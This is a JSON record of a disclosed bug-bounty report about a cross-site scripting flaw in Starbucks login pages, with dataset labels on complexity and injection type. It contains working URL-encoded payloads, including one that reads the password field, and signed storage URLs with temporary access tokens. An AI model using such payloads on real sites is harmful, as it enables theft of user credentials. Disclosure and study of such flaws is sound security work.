{
  "reported_to": "Starbucks",
  "reported_by": "cdl ",
  "title": "Cross-Site Scripting (XSS) on www.starbucks.com | .co.uk login pages",
  "content": "\nHi team,\nSummary:\nThere is a cross-site scripting vulnerability on the login page of www.starbucks.com and various regions, due to improper escaping on the URL path.\nDescription:\nThe login page at https://www.starbucks.com/account/signin builds several links by the relative URL path. An attacker can actually control the relative path:\n<image_0>\nFurthermore, the application does not escape certain characters \u2013 allowing us to break out of the tags and inject a malicious event handler.\nPlatform(s) Affected:\nhttps://www.starbucks.com/account/signin\nhttps://www.starbucks.co.uk/account/signin\nSteps To Reproduce:\nOpen Chrome or Firefox\nVisit https://www.starbucks.com/account/(A(%22%20%252fonmouseover=%22alert%25%32%38%64%6f%63%75%6d%65%6e%74.%64%6f%6d%61%69%6e%25%32%39%22))/signin and in the upper right-hand corner, move your mouse over the \"Find the Store\" button.\nThe XSS will trigger and you'll get an alert() with the value of document.domain\n<image_1>\nExploitation:\nSince this is on the login page, it is absolutely trivial to steal user credentials.\nHere's a simple proof-of-concept, this will just alert() your password back to you:\nhttps://www.starbucks.com/account/(F(%22%20%252fonmouseover=%22%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e%2567%2565%2574%2545%256c%2565%256d%2565%256e%2574%2573%2542%2579%254e%2561%256d%2565%2528%2527%2541%2563%2563%256f%2575%256e%2574%252e%2550%2561%2573%2573%2557%256f%2572%2564%2527%2529%255b%2530%255d%252e%2576%2561%256c%2575%2565%2529%22))/signin\n<image_2>\nHow can the system be exploited with this bug?\nAn attacker can easily abuse this bug to steal user passwords, inject malicious javascript into the context of www.starbucks.com, etc.\nSuggested Mitigation\nImplement HTML encoding / escaping on the path.\nImpact\nThis is a high impact vulnerability as this affects the login page.\nBest,\n@cdl\n\n",
  "severity": [
    7.8,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Generic"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/32imaXYXzUsNF759YEE3Nie4?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-05-22_at_11.45.25_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-05-22_at_11.45.25_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWXARKABP%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T234851Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQClN7DZCqKULHdxPGReW%2BtGboDh0K4PtP%2BzWS67e5RzzQIgUjispeA%2FeivjjBxCkWbHQW1bKC4OUdWgn9LExPJqXakqsgUIHxADGgwwMTM2MTkyNzQ4NDkiDN%2FWlJK2Z9nKoTVE3iqPBYw3QraCA1DwB02p5RpsZkGDC0QHR7u%2BSx3C9kPb9JGNBV%2BhwKonMG1vmszS9ieQyC%2BNgp5T4v9EGX5cKm8KIOmxS%2FWcDOLVBdHBfdyRkYl90pSPBarJBh6Naza81Gjyf%2F0urZdH5t6U7Q3hZD2rwUcB9BET15JQnLoWC5Qxlz0NnMKrKJL4kORErqfOkPYJ9cBktHBS0LJrU0Kuw3yMT25uFMSv5mnGYcpEhWU8i9ZPMIcmBw58kitfv3QbHxzaaS3n2XL1JZ4Vj7jC1juL4HDWsxGzaYZZPk%2BHQdkHIcOML4OKAXZk0j78SGNgizXVoIvj6v1SIqfbpWw%2B4udAWVI3rfWyjDthUe%2FIvp8Bl20rR3j9PAwkfZadcT9BG5cciObR00CP9RZQNmn7ufFThAP3y3wdlIHUW%2FFfnIZZliVpWOj7gLYV3Uk9MAA%2B1d8B9hassF4zAQXwdn%2FPYVBe5Vh9vuuTz8HvChNvQ%2Bdd3G5XP24JCIrF%2FUQ3hx8AmbEQHr01q2NmpgMAMH0NulwTKZuOCnvoYfL34iGE4eIIf8L7fYJWZjmLhUwmbc6ZKEIB03KjSxU%2BlTqpdd2x4KKWVm4kSNPQjUi7rhC%2Fup326OsWC19BLfWQb1%2Bsgu979mPzXv1LhPx3vNuPVwbl5X14XfU72Oa2zZJX2GS0N%2BOo1ErTflrgkh4QW%2FQKSs7g54XY4J7slOcmHu52SBF3FBgX4nnoDzJRoH%2FqxsAofeorMKzVXK%2BnYPZHs2nT5QJpgWF0NHefHJSRX2DQTbS4%2Fm8AyoCtBJ3kcc8YLw1%2FmEmc20unzaYfDGLPjLHRhfLyB2wQqQqtk7AM%2FCDFY0yfbWNu7zaBblt45e12IzYh9jgJKAcwm9KMvwY6sQGGTJEauGXkbYbJ7PkVrb7e7xPBY%2BhFUQc2MIMPrK3SOcvaf7dN19FItI%2Bh%2FkaMpY90hQQ6zNHnHRrzrrBitz77o0M6XwC%2BwKzxU8ljEXvOdO4D9BXIei%2FhzHW82A8FOkR2FuQVRXQu4lvRYuM0ZTG7RqhLlJh9mbJJ1Cpy11FVKZ2SiS907tyotI74Lp9vOz0dfPIwvBCTThtqxjQas%2BitAzQKBwrVlM6b5BV%2FtR%2FWZ4E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=75848bb3fd4f4af03a896cfdb88ab97de437969b6f9833eed517947436bb1733",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tg4hCRGqhbFHmLuwsWSgBhem?response-content-disposition=attachment%3B%20filename%3D%22starbucks.com-loginpagexss.gif%22%3B%20filename%2A%3DUTF-8%27%27starbucks.com-loginpagexss.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWXARKABP%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T234851Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQClN7DZCqKULHdxPGReW%2BtGboDh0K4PtP%2BzWS67e5RzzQIgUjispeA%2FeivjjBxCkWbHQW1bKC4OUdWgn9LExPJqXakqsgUIHxADGgwwMTM2MTkyNzQ4NDkiDN%2FWlJK2Z9nKoTVE3iqPBYw3QraCA1DwB02p5RpsZkGDC0QHR7u%2BSx3C9kPb9JGNBV%2BhwKonMG1vmszS9ieQyC%2BNgp5T4v9EGX5cKm8KIOmxS%2FWcDOLVBdHBfdyRkYl90pSPBarJBh6Naza81Gjyf%2F0urZdH5t6U7Q3hZD2rwUcB9BET15JQnLoWC5Qxlz0NnMKrKJL4kORErqfOkPYJ9cBktHBS0LJrU0Kuw3yMT25uFMSv5mnGYcpEhWU8i9ZPMIcmBw58kitfv3QbHxzaaS3n2XL1JZ4Vj7jC1juL4HDWsxGzaYZZPk%2BHQdkHIcOML4OKAXZk0j78SGNgizXVoIvj6v1SIqfbpWw%2B4udAWVI3rfWyjDthUe%2FIvp8Bl20rR3j9PAwkfZadcT9BG5cciObR00CP9RZQNmn7ufFThAP3y3wdlIHUW%2FFfnIZZliVpWOj7gLYV3Uk9MAA%2B1d8B9hassF4zAQXwdn%2FPYVBe5Vh9vuuTz8HvChNvQ%2Bdd3G5XP24JCIrF%2FUQ3hx8AmbEQHr01q2NmpgMAMH0NulwTKZuOCnvoYfL34iGE4eIIf8L7fYJWZjmLhUwmbc6ZKEIB03KjSxU%2BlTqpdd2x4KKWVm4kSNPQjUi7rhC%2Fup326OsWC19BLfWQb1%2Bsgu979mPzXv1LhPx3vNuPVwbl5X14XfU72Oa2zZJX2GS0N%2BOo1ErTflrgkh4QW%2FQKSs7g54XY4J7slOcmHu52SBF3FBgX4nnoDzJRoH%2FqxsAofeorMKzVXK%2BnYPZHs2nT5QJpgWF0NHefHJSRX2DQTbS4%2Fm8AyoCtBJ3kcc8YLw1%2FmEmc20unzaYfDGLPjLHRhfLyB2wQqQqtk7AM%2FCDFY0yfbWNu7zaBblt45e12IzYh9jgJKAcwm9KMvwY6sQGGTJEauGXkbYbJ7PkVrb7e7xPBY%2BhFUQc2MIMPrK3SOcvaf7dN19FItI%2Bh%2FkaMpY90hQQ6zNHnHRrzrrBitz77o0M6XwC%2BwKzxU8ljEXvOdO4D9BXIei%2FhzHW82A8FOkR2FuQVRXQu4lvRYuM0ZTG7RqhLlJh9mbJJ1Cpy11FVKZ2SiS907tyotI74Lp9vOz0dfPIwvBCTThtqxjQas%2BitAzQKBwrVlM6b5BV%2FtR%2FWZ4E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=60e47cf6f69a56a9ecd5678e97e332663669eba14157a714a85844b97549c4cd",
    "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9L3eeXUg2MosMeitwX7XGJ71?response-content-disposition=attachment%3B%20filename%3D%22starbucks-password-theft-xss.gif%22%3B%20filename%2A%3DUTF-8%27%27starbucks-password-theft-xss.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWXARKABP%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T234851Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQClN7DZCqKULHdxPGReW%2BtGboDh0K4PtP%2BzWS67e5RzzQIgUjispeA%2FeivjjBxCkWbHQW1bKC4OUdWgn9LExPJqXakqsgUIHxADGgwwMTM2MTkyNzQ4NDkiDN%2FWlJK2Z9nKoTVE3iqPBYw3QraCA1DwB02p5RpsZkGDC0QHR7u%2BSx3C9kPb9JGNBV%2BhwKonMG1vmszS9ieQyC%2BNgp5T4v9EGX5cKm8KIOmxS%2FWcDOLVBdHBfdyRkYl90pSPBarJBh6Naza81Gjyf%2F0urZdH5t6U7Q3hZD2rwUcB9BET15JQnLoWC5Qxlz0NnMKrKJL4kORErqfOkPYJ9cBktHBS0LJrU0Kuw3yMT25uFMSv5mnGYcpEhWU8i9ZPMIcmBw58kitfv3QbHxzaaS3n2XL1JZ4Vj7jC1juL4HDWsxGzaYZZPk%2BHQdkHIcOML4OKAXZk0j78SGNgizXVoIvj6v1SIqfbpWw%2B4udAWVI3rfWyjDthUe%2FIvp8Bl20rR3j9PAwkfZadcT9BG5cciObR00CP9RZQNmn7ufFThAP3y3wdlIHUW%2FFfnIZZliVpWOj7gLYV3Uk9MAA%2B1d8B9hassF4zAQXwdn%2FPYVBe5Vh9vuuTz8HvChNvQ%2Bdd3G5XP24JCIrF%2FUQ3hx8AmbEQHr01q2NmpgMAMH0NulwTKZuOCnvoYfL34iGE4eIIf8L7fYJWZjmLhUwmbc6ZKEIB03KjSxU%2BlTqpdd2x4KKWVm4kSNPQjUi7rhC%2Fup326OsWC19BLfWQb1%2Bsgu979mPzXv1LhPx3vNuPVwbl5X14XfU72Oa2zZJX2GS0N%2BOo1ErTflrgkh4QW%2FQKSs7g54XY4J7slOcmHu52SBF3FBgX4nnoDzJRoH%2FqxsAofeorMKzVXK%2BnYPZHs2nT5QJpgWF0NHefHJSRX2DQTbS4%2Fm8AyoCtBJ3kcc8YLw1%2FmEmc20unzaYfDGLPjLHRhfLyB2wQqQqtk7AM%2FCDFY0yfbWNu7zaBblt45e12IzYh9jgJKAcwm9KMvwY6sQGGTJEauGXkbYbJ7PkVrb7e7xPBY%2BhFUQc2MIMPrK3SOcvaf7dN19FItI%2Bh%2FkaMpY90hQQ6zNHnHRrzrrBitz77o0M6XwC%2BwKzxU8ljEXvOdO4D9BXIei%2FhzHW82A8FOkR2FuQVRXQu4lvRYuM0ZTG7RqhLlJh9mbJJ1Cpy11FVKZ2SiS907tyotI74Lp9vOz0dfPIwvBCTThtqxjQas%2BitAzQKBwrVlM6b5BV%2FtR%2FWZ4E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=32c4c9a017a76d20bce674a0860aed354f1a5b3a6834558d80cb7ca9ba898216"
  },
  "disclosed_date": 1593571440,
  "report_url": "https://hackerone.com/reports/881115",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Open Chrome or Firefox and visit the vulnerable URL: https://www.starbucks.com/account/(A(%22%20%252fonmouseover=%22alert%25%32%38%64%6f%63%75%6d%65%6e%74.%64%6f%6d%61%69%6e%25%32%39%22))/signin"
    ],
    [
      2,
      "Move the mouse over the 'Find the Store' button in the upper right-hand corner to trigger the XSS payload (an alert showing document.domain)."
    ]
  ],
  "vuln_description": "The login page of Starbucks websites (e.g., www.starbucks.com) is vulnerable to Cross-Site Scripting (XSS) due to improper escaping of the URL path. An attacker can inject malicious JavaScript via the URL path, which executes when a user interacts with certain elements (e.g., hovering over the 'Find the Store' button). This can be exploited to steal user credentials or perform other malicious actions.",
  "reason": "The vulnerability is straightforward to discover as it involves a common XSS flaw (improper input sanitization) and does not require complex interactions or state manipulation. The attack vector (URL path) is easily accessible, and the payload execution is triggered by a simple user action (mouse hover).",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The XSS vulnerability involves injecting malicious scripts via URL parameters, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing (user_session, action, resource_id) tuples for AuthN/AuthZ issues, not script injection vulnerabilities.",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The XSS vulnerability is triggered via a URL path parameter that is improperly escaped. The methodology's step 3 would identify the URL path as an injectable parameter. The payload uses URL encoding and event handler injection, which could be part of a 'simple payload list' (e.g., basic XSS context-breaking attempts). The payload execution is detectable via regular navigation (moving the mouse over a button), satisfying the 'same channel' requirement. No custom filter bypass or multi-role navigation is required.",
    "is_simple_injection": true
  }
}